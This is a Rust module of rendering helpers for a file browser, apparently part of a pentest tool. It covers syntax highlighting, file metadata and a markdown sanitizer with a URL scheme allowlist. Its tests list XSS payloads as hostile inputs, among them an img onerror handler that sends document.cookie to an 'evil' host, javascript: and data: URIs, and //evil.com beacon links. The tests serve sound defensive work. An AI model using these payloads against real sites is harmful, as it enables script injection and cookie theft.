//! Shared rendering utilities for syntax highlighting, markdown, and file metadata.
//!
//! This module centralises helpers that are used by both the server-rendered
//! file browser (`crate::file_browser`) and the Dioxus UI components
//! (`pentest_ui::components::file_browser`).

use std::sync::LazyLock;

use syntect::highlighting::ThemeSet;
use syntect::html::{css_for_theme_with_class_style, ClassStyle, ClassedHTMLGenerator};
use syntect::parsing::SyntaxSet;
use syntect::util::LinesWithEndings;

// ---------------------------------------------------------------------------
// Syntect statics
// ---------------------------------------------------------------------------

pub static SYNTAX_SET: LazyLock<SyntaxSet> = LazyLock::new(SyntaxSet::load_defaults_newlines);

static SYNTECT_CSS: LazyLock<String> = LazyLock::new(|| {
    let ts = ThemeSet::load_defaults();
    let theme = &ts.themes["base16-ocean.dark"];
    css_for_theme_with_class_style(theme, ClassStyle::Spaced).unwrap_or_default()
});

/// Return the syntect CSS for the `base16-ocean.dark` theme.
pub fn syntect_css() -> &'static str {
    &SYNTECT_CSS
}

// ---------------------------------------------------------------------------
// HTML / text utilities
// ---------------------------------------------------------------------------

/// Escape HTML special characters.
pub fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

/// Format a byte count as a human-readable string.
pub fn format_size(bytes: u64) -> String {
    const KB: u64 = 1024;
    const MB: u64 = 1024 * KB;
    const GB: u64 = 1024 * MB;

    if bytes >= GB {
        format!("{:.1} GB", bytes as f64 / GB as f64)
    } else if bytes >= MB {
        format!("{:.1} MB", bytes as f64 / MB as f64)
    } else if bytes >= KB {
        format!("{:.1} KB", bytes as f64 / KB as f64)
    } else {
        format!("{} B", bytes)
    }
}

// ---------------------------------------------------------------------------
// Timestamp formatting
// ---------------------------------------------------------------------------

/// Format a `SystemTime` as a `YYYY-MM-DD HH:MM:SS` UTC string.
pub fn format_system_time(time: std::time::SystemTime) -> String {
    let datetime: chrono::DateTime<chrono::Utc> = time.into();
    datetime.format("%Y-%m-%d %H:%M:%S").to_string()
}

// ---------------------------------------------------------------------------
// Syntax highlighting
// ---------------------------------------------------------------------------

/// Detect syntax for a filename, falling back to plain text.
pub fn detect_syntax(filename: &str) -> &syntect::parsing::SyntaxReference {
    SYNTAX_SET
        .find_syntax_for_file(filename)
        .ok()
        .flatten()
        .unwrap_or_else(|| SYNTAX_SET.find_syntax_plain_text())
}

/// Highlight code using syntect with classed spans.
pub fn highlight_code(code: &str, filename: &str) -> String {
    let syntax = detect_syntax(filename);
    let mut generator =
        ClassedHTMLGenerator::new_with_class_style(syntax, &SYNTAX_SET, ClassStyle::Spaced);
    for line in LinesWithEndings::from(code) {
        let _ = generator.parse_html_for_line_which_includes_newline(line);
    }
    generator.finalize()
}

/// Highlight code by language name (for markdown fenced blocks).
pub fn highlight_code_by_lang(code: &str, lang: &str) -> String {
    let syntax = SYNTAX_SET
        .find_syntax_by_token(lang)
        .unwrap_or_else(|| SYNTAX_SET.find_syntax_plain_text());
    let mut generator =
        ClassedHTMLGenerator::new_with_class_style(syntax, &SYNTAX_SET, ClassStyle::Spaced);
    for line in LinesWithEndings::from(code) {
        let _ = generator.parse_html_for_line_which_includes_newline(line);
    }
    generator.finalize()
}

// ---------------------------------------------------------------------------
// File type helpers
// ---------------------------------------------------------------------------

/// Map a filename to a Unicode icon based on extension and type.
pub fn file_icon(name: &str, is_dir: bool) -> &'static str {
    if is_dir {
        return "\u{1F4C1}"; // folder
    }
    let lower = name.to_lowercase();
    if let Some(ext) = lower.rsplit('.').next() {
        match ext {
            "rs" => "\u{1F980}",
            "py" => "\u{1F40D}",
            "md" | "mdx" => "\u{1F4DD}",
            "json" | "toml" | "yaml" | "yml" => "\u{1F4DC}",
            "png" | "jpg" | "jpeg" | "gif" | "svg" | "webp" | "ico" | "bmp" => "\u{1F4F7}",
            "sh" | "bash" | "zsh" => "\u{1F4BB}",
            "zip" | "tar" | "gz" | "bz2" | "xz" | "7z" => "\u{1F4E6}",
            _ => "\u{1F4C4}",
        }
    } else {
        "\u{1F4C4}"
    }
}

/// Return the MIME type for a supported image extension, or `None`.
pub fn image_mime_type(path: &str) -> Option<&'static str> {
    let lower = path.to_lowercase();
    let ext = lower.rsplit('.').next()?;
    match ext {
        "png" => Some("image/png"),
        "jpg" | "jpeg" => Some("image/jpeg"),
        "gif" => Some("image/gif"),
        "svg" => Some("image/svg+xml"),
        "webp" => Some("image/webp"),
        "ico" => Some("image/x-icon"),
        "bmp" => Some("image/bmp"),
        _ => None,
    }
}

/// Check if a path has a markdown extension.
pub fn is_markdown(path: &str) -> bool {
    let lower = path.to_lowercase();
    lower.ends_with(".md") || lower.ends_with(".mdx")
}

// ---------------------------------------------------------------------------
// Markdown rendering
// ---------------------------------------------------------------------------

/// URL schemes permitted in rendered-markdown link and image destinations.
///
/// This is an allowlist (default-deny), not a blocklist: any explicit scheme
/// not listed here — `javascript:`, `data:`, `file:`, `vbscript:`, … — is
/// rejected. Relative (scheme-less) URLs are always allowed.
const ALLOWED_URL_SCHEMES: [&str; 3] = ["http", "https", "mailto"];

/// Return `true` if `url` is safe to use as a link or image destination.
///
/// Relative URLs (no scheme) are allowed. A URL with an explicit scheme is
/// allowed only if that scheme is in [`ALLOWED_URL_SCHEMES`]. Leading ASCII
/// whitespace and control characters are stripped first, the way browsers do
/// when parsing a scheme, so `"\tjavascript:…"` cannot smuggle a rejected
/// scheme past the check. Non-ASCII/other-scheme prefixes (e.g. a leading
/// U+00A0 before `javascript:`) fall through to the allowlist and are rejected
/// by default-deny.
///
/// Protocol-relative URLs (`"//host/…"`) are rejected: they resolve to a remote
/// origin, so they are treated as unsafe rather than as a scheme-less relative
/// path (#365 review — avoids silent remote fetches/exfiltration beacons).
/// Backslashes are folded to `/` first, so browser-equivalent shapes like
/// `"/\host"` and `"\\host"` are rejected too (#367 review).
fn is_safe_url(url: &str) -> bool {
    let trimmed = url.trim_start_matches(|c: char| c.is_ascii_whitespace() || c.is_control());
    // Browsers fold '\' to '/' when resolving http(s) URLs (WHATWG URL spec), so
    // "/\evil.com" and "\\evil.com" both resolve to a remote origin even though
    // neither literally starts with "//". Normalize backslashes to slashes before
    // the protocol-relative and scheme checks so neither shape slips through as a
    // scheme-less "relative" path (#367 review). A backslash is not legal in a URL
    // scheme, so this can only split a would-be scheme earlier — never forge an
    // allowed one.
    let normalized = trimmed.replace('\\', "/");
    if normalized.starts_with("//") {
        return false;
    }
    // The scheme is the text before the first ':' — but only when that ':'
    // appears before any '/', '?', or '#', which would instead mark a
    // relative/path reference (e.g. "/a?b#c" has no scheme).
    match normalized.find([':', '/', '?', '#']) {
        Some(idx) if normalized.as_bytes()[idx] == b':' => {
            let scheme = &normalized[..idx];
            ALLOWED_URL_SCHEMES
                .iter()
                .any(|s| scheme.eq_ignore_ascii_case(s))
        }
        _ => true,
    }
}

/// Stateful sanitizer that makes a markdown event stream safe to feed to
/// `dangerous_inner_html`.
///
/// Feed every parser event through [`process`](MarkdownSanitizer::process) in
/// order. It:
/// - drops raw/inline HTML events, so untrusted markdown cannot inject
///   `<script>`, event-handler attributes, `<iframe>`, …;
/// - scheme-allowlists link/image destinations via [`is_safe_url`], and when a
///   destination is rejected it *unwraps* the element — the `<a>`/`<img>` is
///   dropped and its child text is kept. This avoids the inert `href=""`/`src=""`
///   an emptied destination would produce, which re-navigates or re-fetches the
///   current document, and gives no misleading "this is a link" affordance
///   (#367 review). Unwrapping is why this is stateful: the opening tag's verdict
///   must be remembered so the matching close tag is dropped too.
///
/// This is the shared choke point for all markdown rendering in the app (#365):
/// [`render_markdown_raw`] and the chat panel's renderer both route through it,
/// so the sanitization cannot drift between the two. Renderers that also build
/// their own trusted HTML (e.g. syntect code highlighting) inject it separately
/// and must not pass it through this sanitizer.
///
/// # Parser-option coupling (#367 review)
///
/// This sanitizer only inspects `Tag::Link` and `Tag::Image`; it assumes the only
/// attribute sinks pulldown-cmark can emit are link/image destinations. Callers
/// enable a conservative option set today. Turning on options that emit new
/// attributes — `ENABLE_HEADING_ATTRIBUTES` (id/class on headings) or math —
/// would add sinks this sanitizer does not yet cover and requires re-reviewing it.
#[derive(Default)]
pub struct MarkdownSanitizer {
    /// One entry per currently-open link/image scope: `true` if that scope was
    /// dropped (unsafe destination) and its closing tag must be dropped too.
    dropped_scopes: Vec<bool>,
}

impl MarkdownSanitizer {
    pub fn new() -> Self {
        Self::default()
    }

    /// Sanitize one event. Returns `None` to drop it. Must be called on the full
    /// event stream in order so link/image open/close tags stay balanced.
    pub fn process<'a>(
        &mut self,
        event: pulldown_cmark::Event<'a>,
    ) -> Option<pulldown_cmark::Event<'a>> {
        use pulldown_cmark::{Event, Tag, TagEnd};

        // Classify while only *borrowing* the event, so we can still move it
        // afterwards. `is_safe_url` decides whether an opening link/image is kept.
        enum Action {
            Drop,
            OpenScope(bool),
            CloseScope,
            Pass,
        }
        let action = match &event {
            Event::Html(_) | Event::InlineHtml(_) => Action::Drop,
            Event::Start(Tag::Link { dest_url, .. })
            | Event::Start(Tag::Image { dest_url, .. }) => {
                Action::OpenScope(!is_safe_url(dest_url))
            }
            Event::End(TagEnd::Link) | Event::End(TagEnd::Image) => Action::CloseScope,
            _ => Action::Pass,
        };

        match action {
            Action::Drop => None,
            Action::OpenScope(dropped) => {
                self.dropped_scopes.push(dropped);
                // Dropped: unwrap the element, keep its children (emitted next).
                if dropped {
                    None
                } else {
                    Some(event)
                }
            }
            Action::CloseScope => {
                let dropped = self.dropped_scopes.pop().unwrap_or(false);
                if dropped {
                    None
                } else {
                    Some(event)
                }
            }
            Action::Pass => Some(event),
        }
    }
}

/// Render markdown to raw HTML (no wrapper div).
///
/// Fenced code blocks are syntax-highlighted via syntect. Untrusted HTML and
/// unsafe link/image schemes are stripped via [`MarkdownSanitizer`].
pub fn render_markdown_raw(content: &str) -> String {
    use pulldown_cmark::{CodeBlockKind, CowStr, Event, Options, Parser, Tag, TagEnd};

    let options =
        Options::ENABLE_TABLES | Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TASKLISTS;

    let parser = Parser::new_ext(content, options);

    let mut in_code_block = false;
    let mut code_lang = String::new();
    let mut code_buf = String::new();

    let mut events: Vec<Event> = Vec::new();
    let mut sanitizer = MarkdownSanitizer::new();

    for event in parser {
        match event {
            Event::Start(Tag::CodeBlock(CodeBlockKind::Fenced(ref lang))) => {
                in_code_block = true;
                code_lang = lang.to_string();
                code_buf.clear();
            }
            Event::End(TagEnd::CodeBlock) if in_code_block => {
                in_code_block = false;
                let highlighted = if code_lang.is_empty() {
                    html_escape(&code_buf)
                } else {
                    highlight_code_by_lang(&code_buf, &code_lang)
                };
                let html = format!(
                    r#"<pre><code class="language-{lang}">{code}</code></pre>"#,
                    lang = html_escape(&code_lang),
                    code = highlighted,
                );
                // Trusted, locally-built HTML — intentionally bypasses the
                // markdown sanitizer that all other events flow through.
                events.push(Event::Html(CowStr::from(html)));
            }
            Event::Text(ref text) if in_code_block => {
                code_buf.push_str(text);
            }
            // Security (#365): every other event goes through the shared
            // sanitizer, which drops raw/inline HTML and scheme-allowlists
            // link/image URLs (unwrapping rejected ones).
            other => {
                if let Some(safe) = sanitizer.process(other) {
                    events.push(safe);
                }
            }
        }
    }

    let mut html_output = String::new();
    pulldown_cmark::html::push_html(&mut html_output, events.into_iter());
    html_output
}

/// Render markdown to HTML wrapped in `<div class="markdown-body">...</div>`.
///
/// This is the variant used by the server-rendered file browser.
pub fn render_markdown(content: &str) -> String {
    format!(
        r#"<div class="markdown-body">{}</div>"#,
        render_markdown_raw(content)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- is_safe_url: the default-deny scheme allowlist (unit level) ---

    #[test]
    fn is_safe_url_allows_relative_and_allowlisted_schemes() {
        assert!(is_safe_url("https://example.com/path?q=1#frag"));
        assert!(is_safe_url("http://example.com"));
        assert!(is_safe_url("mailto:alice@example.com"));
        assert!(is_safe_url("/browse?path=/tmp")); // relative path
        assert!(is_safe_url("relative/file.md")); // no scheme
        assert!(is_safe_url("#section")); // fragment only
        assert!(is_safe_url("HtTpS://EXAMPLE.com")); // scheme is case-insensitive
    }

    #[test]
    fn is_safe_url_rejects_dangerous_schemes() {
        assert!(!is_safe_url("javascript:alert(1)"));
        assert!(!is_safe_url("JaVaScript:alert(1)"));
        assert!(!is_safe_url("data:text/html,<script>alert(1)</script>"));
        assert!(!is_safe_url("file:///etc/passwd"));
        assert!(!is_safe_url("vbscript:msgbox(1)"));
    }

    #[test]
    fn is_safe_url_rejects_protocol_relative() {
        // "//host" resolves to a remote origin — reject it rather than treat it
        // as a scheme-less relative path (#365 review).
        assert!(!is_safe_url("//evil.com/log?c=secret"));
        assert!(!is_safe_url("\t//evil.com/pixel.png")); // still rejected after trim

        // Backslash variants: browsers fold '\' to '/', so these resolve to a
        // remote origin too and must not pass as relative paths (#367 review).
        assert!(!is_safe_url("/\\evil.com/log?c=1")); // "/\evil.com" => "//evil.com"
        assert!(!is_safe_url("\\\\evil.com/log")); // "\\evil.com" => "//evil.com"
        assert!(!is_safe_url("\t/\\evil.com/pixel.png")); // control + backslash combo
    }

    #[test]
    fn is_safe_url_rejects_scheme_smuggled_with_leading_or_embedded_controls() {
        // Browsers ignore leading whitespace/control chars when reading a scheme.
        assert!(!is_safe_url("\tjavascript:alert(1)"));
        assert!(!is_safe_url("  javascript:alert(1)"));
        assert!(!is_safe_url("\n\rjavascript:alert(1)"));
        // Embedded control char yields an unknown scheme, which default-deny rejects.
        assert!(!is_safe_url("java\u{0000}script:alert(1)"));
        // A non-ASCII leading space (U+00A0) is not stripped, so the scheme
        // ("\u{a0}javascript") fails the allowlist by default-deny.
        assert!(!is_safe_url("\u{00A0}javascript:alert(1)"));
    }

    // --- render_markdown_raw: end-to-end neutralization of hostile markdown ---

    #[test]
    fn strips_raw_script_tag() {
        let out = render_markdown_raw("hi\n\n<script>alert(document.cookie)</script>\n");
        assert!(!out.contains("<script"), "script tag leaked: {out}");
        assert!(
            out.contains("<p>hi</p>"),
            "surrounding markdown lost: {out}"
        );
    }

    #[test]
    fn strips_img_onerror_handler() {
        let out =
            render_markdown_raw("<img src=x onerror=\"fetch('http://evil/'+document.cookie)\">");
        assert!(!out.contains("onerror"), "event handler leaked: {out}");
        assert!(!out.contains("<img"), "raw img tag leaked: {out}");
    }

    #[test]
    fn strips_iframe_and_event_handler_elements() {
        let iframe = render_markdown_raw("<iframe src=\"http://evil.example\"></iframe>");
        assert!(!iframe.contains("<iframe"), "iframe leaked: {iframe}");
        let handler = render_markdown_raw("<div onmouseover=\"alert(1)\">x</div>");
        assert!(
            !handler.contains("onmouseover"),
            "event handler leaked: {handler}"
        );
    }

    #[test]
    fn neutralizes_javascript_and_file_links() {
        let js = render_markdown_raw("[x](javascript:alert(1))");
        assert!(
            !js.contains("javascript:"),
            "javascript scheme leaked: {js}"
        );
        let file = render_markdown_raw("[x](file:///etc/passwd)");
        assert!(!file.contains("file:"), "file scheme leaked: {file}");
    }

    #[test]
    fn neutralizes_data_uri_image() {
        let out = render_markdown_raw("![x](data:text/html,<script>alert(1)</script>)");
        assert!(!out.contains("data:"), "data uri leaked: {out}");
    }

    #[test]
    fn neutralizes_protocol_relative_link_and_image() {
        let link = render_markdown_raw("[x](//evil.com/log?c=secret)");
        assert!(
            !link.contains("//evil.com"),
            "protocol-relative link leaked: {link}"
        );
        let img = render_markdown_raw("![x](//evil.com/pixel.png)");
        assert!(
            !img.contains("//evil.com"),
            "protocol-relative image leaked: {img}"
        );
    }

    #[test]
    fn neutralizes_backslash_protocol_relative() {
        // Browsers fold '\' to '/', so "/\host" resolves to a remote origin. Must
        // be neutralized end-to-end, not just in is_safe_url (#367 review).
        let out = render_markdown_raw("[x](/\\evil.com/log?c=1)");
        assert!(
            !out.contains("evil.com"),
            "backslash protocol-relative link leaked: {out}"
        );
    }

    #[test]
    fn unwraps_rejected_link_and_image_keeping_text() {
        // A rejected link is unwrapped: no <a> element and no inert href="", but
        // the visible label text is preserved (#367 review).
        let link = render_markdown_raw("see [click me](javascript:alert(1)) now");
        assert!(
            !link.contains("<a "),
            "rejected link kept an anchor: {link}"
        );
        assert!(
            !link.contains("href=\"\""),
            "rejected link left an inert empty href: {link}"
        );
        assert!(link.contains("click me"), "link label text lost: {link}");

        // A rejected image is unwrapped: no <img> and no inert src="", with the
        // alt text surfaced as plain text instead.
        let img = render_markdown_raw("![the alt text](javascript:alert(1))");
        assert!(
            !img.contains("<img"),
            "rejected image kept an img element: {img}"
        );
        assert!(
            !img.contains("src=\"\""),
            "rejected image left an inert empty src: {img}"
        );
        assert!(img.contains("the alt text"), "image alt text lost: {img}");
    }

    #[test]
    fn neutralizes_javascript_via_autolink_and_reference() {
        // Autolink `<scheme:...>`: the URI becomes both href and visible text.
        // Only the href is a sink — the text is inert — so assert on the href.
        let auto = render_markdown_raw("<javascript:alert(1)>");
        assert!(
            !auto.contains("href=\"javascript:"),
            "autolink scheme reached href: {auto}"
        );
        // Reference-style link resolving to a dangerous destination.
        let reference = render_markdown_raw("[x][r]\n\n[r]: javascript:alert(1)\n");
        assert!(
            !reference.contains("href=\"javascript:"),
            "reference-style scheme reached href: {reference}"
        );
    }

    #[test]
    fn title_attribute_cannot_break_out() {
        // A crafted title tries to inject an event handler; push_html entity-
        // encodes attribute values, so no real quote closes the title attribute.
        let out = render_markdown_raw("[x](https://ok.com \"z\\\" onmouseover=\\\"alert(1)\")");
        assert!(
            !out.contains("\" onmouseover=\""),
            "title attribute broke out: {out}"
        );
    }

    #[test]
    fn preserves_safe_links_and_images() {
        assert!(render_markdown_raw("[ok](https://example.com/)")
            .contains("href=\"https://example.com/\""));
        assert!(render_markdown_raw("[ok](/browse)").contains("href=\"/browse\""));
        assert!(render_markdown_raw("[mail](mailto:a@b.com)").contains("href=\"mailto:a@b.com\""));
        assert!(render_markdown_raw("![alt](https://example.com/i.png)")
            .contains("src=\"https://example.com/i.png\""));
    }

    #[test]
    fn preserves_plain_markdown_and_highlighted_code() {
        let out =
            render_markdown_raw("# Title\n\n**bold** and `code`\n\n```rust\nlet x = 1;\n```\n");
        assert!(out.contains("<h1>Title</h1>"), "heading lost: {out}");
        assert!(out.contains("<strong>bold</strong>"), "bold lost: {out}");
        assert!(
            out.contains("language-rust"),
            "fenced-code highlighting lost: {out}"
        );
    }

    #[test]
    fn neutralizes_entity_and_percent_encoded_schemes() {
        // The security-reviewer flagged encoded schemes (#367 review). Proven
        // empirically against pulldown-cmark 0.12.2: HTML entities in a
        // destination ARE decoded before the filter runs, so `&#106;avascript:`
        // becomes `javascript:` and is rejected by default-deny. Percent-encoding
        // is NOT decoded, so `%6Aavascript` stays an unknown scheme and is also
        // rejected. Both collapse to an inert empty href.
        let entity = render_markdown_raw("[x](&#106;avascript:alert(1))");
        assert!(
            !entity.contains("avascript") && !entity.contains("alert"),
            "entity-encoded scheme leaked: {entity}"
        );
        let pct = render_markdown_raw("[x](%6Aavascript:alert(1))");
        assert!(
            !pct.contains("avascript") && !pct.contains("alert"),
            "percent-encoded scheme leaked: {pct}"
        );
    }
}
